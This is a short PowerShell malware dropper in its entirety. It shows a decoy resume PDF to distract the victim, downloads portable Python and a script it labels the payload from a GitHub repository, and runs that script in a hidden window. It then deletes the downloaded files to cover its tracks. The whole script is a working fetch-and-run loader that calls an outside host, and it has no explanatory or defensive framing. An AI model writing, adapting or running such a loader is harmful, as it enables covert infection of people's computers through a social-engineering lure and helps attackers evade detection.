# Silent PowerShell launcher - No windows visible
$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'

# Open PDF first (user distraction)
Invoke-WebRequest -Uri 'https://github.com/workspacehome0/download/raw/main/FakeResume.pdf' -OutFile "$env:temp\doc.pdf" -UseBasicParsing
Start-Process "$env:temp\doc.pdf"
Start-Sleep -Seconds 2

# Download Python portable
Invoke-WebRequest -Uri 'https://github.com/workspacehome0/download/raw/main/python-portable.zip' -OutFile "$env:temp\py.zip" -UserAgent 'Mozilla/5.0' -UseBasicParsing
Start-Sleep -Seconds 2

# Extract Python
Expand-Archive -Path "$env:temp\py.zip" -DestinationPath "$env:temp\py" -Force
Start-Sleep -Seconds 2

# Download payload
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/workspacehome0/download/refs/heads/main/user.py' -OutFile "$env:temp\user.py" -UseBasicParsing

# Run payload hidden
if (Test-Path "$env:temp\py\python.exe") {
    Start-Process -WindowStyle Hidden "$env:temp\py\python.exe" -ArgumentList "$env:temp\user.py"
}

# Cleanup after delay
Start-Sleep -Seconds 15
Remove-Item "$env:temp\py.zip" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:temp\user.py" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:temp\doc.pdf" -Force -ErrorAction SilentlyContinue
Remove-Item -Recurse -Force "$env:temp\py" -ErrorAction SilentlyContinue

